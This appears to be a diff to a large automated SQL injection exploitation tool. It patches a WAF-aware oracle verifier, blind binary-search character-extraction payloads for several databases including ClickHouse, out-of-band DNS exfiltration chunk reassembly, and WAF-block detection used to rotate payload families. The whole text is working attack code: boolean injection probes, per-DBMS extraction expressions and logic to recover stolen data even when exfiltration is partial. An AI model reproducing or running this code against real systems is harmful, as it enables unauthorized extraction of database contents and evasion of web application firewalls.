+                        "403/WAF  FULL oracle (both DIFFERENTIAL body + timing signals confirmed behind WAF)")
                 elif diff_capable:
                     oracle_mode = OracleMode.DIFFERENTIAL
                     can_scan    = True
@@ -141441,9 +141772,58 @@ class SafeModeVerifier:
 
                 if _waf_blocks_payloads:
                     warnings.append("Silent WAF detected  blocks SQL payloads with 200 status on clean")
-                    # WAF found: try DIFFERENTIAL oracle
-                    oracle_mode = OracleMode.DIFFERENTIAL
-                    can_scan    = True
+                    # BUG-SAFEMODE-DIFFERENTIAL-NO-PROBE FIX (HIGH): The original code
+                    # unconditionally assigned DIFFERENTIAL when a silent WAF was detected,
+                    # without verifying that boolean true/false probes actually produce
+                    # DIFFERENT body/status responses.  A WAF that blocks SQL keywords
+                    # identically (same block page for all payloads) produces no differential
+                    # signal → DIFFERENTIAL oracle yields nothing, but the code reports it as
+                    # capable.  Run the same capability probe that the WAF/403 branch uses
+                    # (5-round EMD/body-diff check) before committing to DIFFERENTIAL.
+                    _silwaf_diff_capable = False
+                    _silwaf_diff_rounds  = 0
+                    _silwaf_diff_emds    = []
+                    try:
+                        _sw_fmt = "json" if (data or "").strip().startswith("{") else "form"
+                        _sw_b_pls = get_dbms_payloads('MySQL', 'Boolean', 1)
+                        _sw_b_alt = get_dbms_payloads('PostgreSQL', 'Boolean', 1)
+                        _sw_probes = [
+                            (_sw_b_pls[0] if _sw_b_pls else " AND 1=1-- -",
+                             _sw_b_pls[1] if len(_sw_b_pls) > 1 else " AND 1=2-- -"),
+                            (_sw_b_alt[0] if _sw_b_alt else " AND true-- -",
+                             _sw_b_alt[1] if len(_sw_b_alt) > 1 else " AND false-- -"),
+                            (" AND CASE WHEN 1=1 THEN 1 ELSE 0 END=1-- -",
+                             " AND CASE WHEN 1=2 THEN 1 ELSE 0 END=1-- -"),
+                        ]
+                        import random as _sw_rand
+                        for _sw_dr in range(5):
+                            _sw_tp, _sw_fp = _sw_probes[_sw_dr % len(_sw_probes)]
+                            _sw_url_t = url + ("&" if "?" in url else "?") + f"_smvnonce={_sw_rand.randint(100000,999999)}"
+                            _sw_url_f = url + ("&" if "?" in url else "?") + f"_smvnonce={_sw_rand.randint(100000,999999)}"
+                            _sw_fp_t = await _send_injected(engine, method, _sw_url_t, data, _sw_fmt,
+                                                             param, original + _sw_tp, [])
+                            _sw_fp_f = await _send_injected(engine, method, _sw_url_f, data, _sw_fmt,
+                                                             param, original + _sw_fp, [])
+                            if _sw_fp_t is None or _sw_fp_f is None:
+                                continue
+                            _sw_emd = WassersteinResponseOracle.wasserstein1(_sw_fp_t.body, _sw_fp_f.body)
+                            _sw_len_d = abs(_sw_fp_t.content_length - _sw_fp_f.content_length)
+                            _sw_stat_d = _get_safe_status_code(_sw_fp_t) != _get_safe_status_code(_sw_fp_f)
+                            _silwaf_diff_emds.append(_sw_emd)
+                            if _sw_emd > 0.018 or _sw_len_d > 150 or _sw_stat_d:
+                                _silwaf_diff_rounds += 1
+                            await asyncio.sleep(0.15)
+                        _silwaf_diff_capable = _silwaf_diff_rounds >= 3
+                    except Exception as _sw_e:
+                        LOG.debug(f"[SafeMode] Silent WAF differential probe failed: {_sw_e}")
+                    if _silwaf_diff_capable:
+                        oracle_mode = OracleMode.DIFFERENTIAL
+                        can_scan    = True
+                        warnings.append(f"Silent WAF  DIFFERENTIAL oracle confirmed ({_silwaf_diff_rounds}/5 rounds)")
+                    else:
+                        oracle_mode = OracleMode.TIMING_ONLY
+                        can_scan    = True
+                        warnings.append(f"Silent WAF blocks all payloads uniformly  TIMING_ONLY oracle ({_silwaf_diff_rounds}/5 diff rounds)")
                 elif _is_5xx:
                     oracle_mode = OracleMode.FULL
                     can_scan    = True
@@ -146956,7 +147336,18 @@ class SideChannelExtractor:
             # case-sensitive. ASCII/SUBSTR/COALESCE (uppercase) are not ClickHouse built-ins
             # → "Unknown function" error on every probe → extraction fails silently.
             # ClickHouse built-ins: ascii(), substring(), coalesce() (all lowercase).
-            return f"coalesce(ascii(substring(({expr}),{pos},1)),0)>={threshold}"
+            #
+            # BUG-SCE-CLICKHOUSE-UNICODE FIX: ClickHouse's ascii() returns the ordinal of
+            # the FIRST BYTE of the UTF-8 representation (0-255), not the Unicode codepoint.
+            # For characters with codepoints > 255 this means the binary search would compare
+            # threshold against a UTF-8 lead byte, producing wrong character extraction.
+            # Fix: use toUInt32OrNull(substring(({expr}),{pos},1)) which casts the first
+            # CHARACTER (not byte — ClickHouse 20.x+ treats string positions as character
+            # positions in UTF-8 by default) to its UInt32 representation.  For single-byte
+            # code points (U+0000 – U+00FF) this equals the codepoint; for multi-byte code
+            # points this gives the Unicode codepoint directly.  Falls back to 0 on NULL
+            # via coalesce so the binary search skips unknown positions gracefully.
+            return f"coalesce(toUInt32OrNull(substring(({expr}),{pos},1)),0)>={threshold}"
         else:
             # PostgreSQL, CockroachDB, YugabyteDB, Amazon Redshift, Oracle, DB2, etc.
             return f"COALESCE(ASCII(SUBSTR(({expr}),{pos},1)),0)>={threshold}"
@@ -147862,8 +148253,20 @@ class SideChannelExtractor:
                                                 _max_ci = max(_received_chunks)
                                                 _have_all = all(_i in _received_chunks
                                                                 for _i in range(_max_ci + 1))
+                                                # BUG-OOB-EXACT-30-BYTES FIX: The original `< _OOB_PG_CHUNK_SIZE`
+                                                # never triggered for strings whose length is an exact multiple of
+                                                # the chunk size (e.g. exactly 30 bytes — chunk 0 arrives full,
+                                                # chunk 1 never fires because SUBSTRING returned empty → no DNS
+                                                # callback → _max_ci stays 0 but _last_short = 30 < 30 = False
+                                                # → assembly never triggered in the polling loop → data only
+                                                # recovered at deadline via the fallback block, wasting the
+                                                # remaining poll window.
+                                                # Fix: also trigger assembly when all expected chunks (0 to
+                                                # _OOB_PG_MAX_CHUNKS-1) have arrived (string filled all slots),
+                                                # which is the only other conclusive termination condition.
                                                 _last_short = len(_received_chunks[_max_ci]) < _OOB_PG_CHUNK_SIZE
-                                                if _have_all and _last_short:
+                                                _all_slots_full = _max_ci >= _OOB_PG_MAX_CHUNKS - 1
+                                                if _have_all and (_last_short or _all_slots_full):
                                                     _assembled = b"".join(
                                                         _received_chunks[_i]
                                                         for _i in range(_max_ci + 1))
@@ -147892,6 +148295,17 @@ class SideChannelExtractor:
                         if _oob_reachable and time.monotonic() > _deadline - 5:
                             # BUG-OOB1 FIX: At deadline, assemble any partial chunks received
                             # (e.g., value is exactly 30 bytes — chunk 0 full, chunk 1 never fires).
+                            # BUG-OOB-PARTIAL-ASSEMBLY FIX: The original deadline fallback ONLY
+                            # assembled when `_have_all` was True (all indices 0..max_ci present).
+                            # If a chunk was lost (e.g., chunk 1 of 3 never arrived due to DNS
+                            # resolution failure), `_have_all` = False and ALL received chunks were
+                            # silently discarded — even the contiguous prefix (chunks 0..0 in a 0,2
+                            # gap scenario) that held useful data.
+                            # Fix: if `_have_all` is False, assemble the LONGEST CONTIGUOUS prefix
+                            # starting from chunk 0.  This recovers the data up to the first gap
+                            # (which is better than returning nothing) and is clearly labeled
+                            # "partial" in the log.  If _have_all IS True, assemble the full set
+                            # as before (no change to the happy path).
                             if _received_chunks and not _extracted:
                                 _max_ci = max(_received_chunks)
                                 _have_all = all(_i in _received_chunks for _i in range(_max_ci + 1))
@@ -147901,6 +148315,18 @@ class SideChannelExtractor:
                                     _extracted = _assembled.decode("utf-8", errors="replace")
                                     print(f"[SideChannel]  OOB partial assembly at deadline: {_extracted[:60]}",
                                           flush=True)
+                                else:
+                                    # Assemble the longest contiguous prefix from chunk 0
+                                    _prefix_ci = 0
+                                    while _prefix_ci in _received_chunks:
+                                        _prefix_ci += 1
+                                    if _prefix_ci > 0:  # we have at least chunk 0
+                                        _assembled = b"".join(
+                                            _received_chunks[_i] for _i in range(_prefix_ci))
+                                        _extracted = _assembled.decode("utf-8", errors="replace")
+                                        print(f"[SideChannel]  OOB PARTIAL assembly at deadline "
+                                              f"({_prefix_ci}/{_max_ci + 1} chunks, gap detected): "
+                                              f"{_extracted[:60]}", flush=True)
                             break  # OOB confirmed reachable, last 5s used up
                     except Exception:
                         pass
@@ -153116,7 +153542,17 @@ class ChameleonExtractor:
                 except Exception:
                     pass
             sim    = SimHasher.body_similarity(self._norm_sample, norm_b)
-            if 0.45 < sim < 0.60:
+            # BUG-CHAMELEON-WAF-BLOCK-RANGE FIX (MEDIUM, ChameleonExtractor,
+            # all boolean-based techniques on WAF-protected targets):
+            # The original guard `0.45 < sim < 0.60` only detected "soft" WAF blocks
+            # (sim in the 0.45–0.60 band — partial page replacement by WAF). Hard WAF
+            # blocks return a completely different body (sim near 0) and were not caught,
+            # causing _mark_blocked to never fire for hard-block WAFs (Cloudflare, Imperva
+            # full-page replacement). Consequence: WAF-blocked families were never rotated
+            # away, every probe used the same blocked family, all probes returned sim~0,
+            # and the boolean oracle collapsed (all True == all False == 0). Fix: extend
+            # the lower bound to 0 so any sim < 0.60 (including 0.0) triggers _mark_blocked.
+            if sim < 0.60:
                 self._mark_blocked(dbms, fam_idx)
             return sim
         except Exception:
@@ -153183,6 +153619,18 @@ class ChameleonExtractor:
             "Oracle":      _ORACLE_ASCIISTR_CHARFN,
             "SQLite":      "COALESCE(UNICODE(SUBSTR(({query}),{pos},1)),0)",
             "Firebird":    "ASCII_VAL(SUBSTRING(({query}) FROM {pos} FOR 1))",
+            # BUG-CHAMELEON-CLICKHOUSE-CHARFN FIX (CRITICAL): ClickHouse was absent from
+            # _chameleon_charfn_defaults → fell to the else-branch default at line 153575:
+            #   "ASCII(SUBSTRING(({query}),{pos},1))"
+            # ClickHouse function names are case-sensitive — uppercase ASCII() and SUBSTRING()
+            # are NOT valid ClickHouse built-ins → "Unknown function ASCII" SQL error on every
+            # binary-search probe → oracle always returns False → ChameleonExtractor extracts
+            # empty string / chr(0) for every character position on ClickHouse targets.
+            # Fix: add explicit ClickHouse entry using lowercase ascii() and substring(),
+            # with coalesce() to handle NULL on end-of-string (position past end returns NULL
+            # in ClickHouse). toUInt32OrNull() returns the full Unicode codepoint (not just the
+            # first byte), matching the char_hi = 1114111 used for ClickHouse elsewhere.
+            "ClickHouse":  "coalesce(toUInt32OrNull(substring(({query}),{pos},1)),0)",
         }
         _chameleon_default_fn = _chameleon_charfn_defaults.get(
             _chameleon_dbms, "ASCII(SUBSTRING(({query}),{pos},1))")
@@ -153872,11 +154320,20 @@ class AdaptiveFrequencyExtractor:
         # targets serving globalised applications. Fix: add Oracle to the 65535 branch
         # alongside MSSQL/Sybase (all three use ASCIISTR/UNICODE→BMP range 0-65535).
         # Matches _build_dbms_char_hi("Oracle") which already returns 65535.
+        # BUG-AFE-CLICKHOUSE-CHAR-HI FIX (MEDIUM, ClickHouse,
+        # AdaptiveFrequencyExtractor.extract_string, all B/BH/IN techniques):
+        # ClickHouse was absent from both the 65535 and 1114111 branches, falling
+        # to else 255. ClickHouse stores strings as UTF-8 and
+        # toUInt32OrNull()/toUInt32() returns the full Unicode codepoint (0..1114111).
+        # With ceiling=255, any ClickHouse character with code point 256-1114111
+        # (CJK, Arabic, emoji, etc.) silently converged at chr(255)='ÿ'. Fix: add
+        # ClickHouse to the 1114111 branch alongside MySQL/PostgreSQL/SQLite.
         _afe_char_hi = (65535 if _afe_dbms_hi in ("MSSQL", "Sybase", "Oracle")
                         else 1114111 if _afe_dbms_hi in (
                             "SQLite", "MySQL", "MariaDB", "TiDB",
                             "PostgreSQL", "CockroachDB", "YugabyteDB",
-                            "Amazon Redshift")  # BUG-V139-AFE-AMZN-REDSHIFT-CHARHI FIX
+                            "Amazon Redshift",  # BUG-V139-AFE-AMZN-REDSHIFT-CHARHI FIX
+                            "ClickHouse")       # BUG-AFE-CLICKHOUSE-CHAR-HI FIX
                         else 255)
         # BUG-AFE-LO-INIT FIX (MEDIUM, all 5 DBMSes, all surfaces):
         # Was `lo, hi = 32, _afe_char_hi`. When char_func returns 0 (COALESCE/NVL/ISNULL→0
@@ -154092,6 +154549,16 @@ class AdaptiveFrequencyExtractor:
             ),  # BUG-V139-AFE-ORACLE-CHARFN-FALLBACK FIX: was NVL(ASCII(SUBSTR())))
             "SQLite":      "COALESCE(UNICODE(SUBSTR(({query}),{pos},1)),0)",
             "Firebird":    "ASCII_VAL(SUBSTRING(({query}) FROM {pos} FOR 1))",
+            # BUG-AFE-CLICKHOUSE-CHARFN FIX (MEDIUM, ClickHouse,
+            # AdaptiveFrequencyExtractor.extract_string, all B/BH/IN techniques):
+            # ClickHouse was absent from _afe_charfn_defaults → fell through to the
+            # default "ASCII(SUBSTRING(...))" which is invalid ClickHouse SQL →
+            # every AFE probe returned a parse error → binary search could not
+            # converge → all characters extracted as None/empty.
+            # Fix: use ClickHouse-native coalesce(toUInt32OrNull(...), 0) which
+            # returns the full Unicode codepoint (0..1114111) for any UTF-8 string.
+            # Functions are lowercase per ClickHouse convention.
+            "ClickHouse":  "coalesce(toUInt32OrNull(substring(({query}),{pos},1)),0)",
         }
         _afe_default_fn = _afe_charfn_defaults.get(
             _afe_dbms, "ASCII(SUBSTRING(({query}),{pos},1))")
@@ -170145,8 +170612,10 @@ class ChameleonExtractorV18(ChameleonExtractor):
                     pass
             sim = SimHasher.body_similarity(self._norm_sample, norm_b)
             # Track blocked families (same as base class)
+            # BUG-CHAMELEON-WAF-BLOCK-RANGE FIX (same as base class fix):
+            # `0.45 < sim < 0.60` misses hard blocks (sim near 0). Fix: sim < 0.60.
             fams = self._families_merged.get(dbms, [])
-            if fams and 0.45 < sim < 0.60:
+            if fams and sim < 0.60:
                 # Approximate family index from position
                 _fam_idx = (self._probe_n * 7) % max(1, len(fams))
                 self._mark_blocked(dbms, _fam_idx)
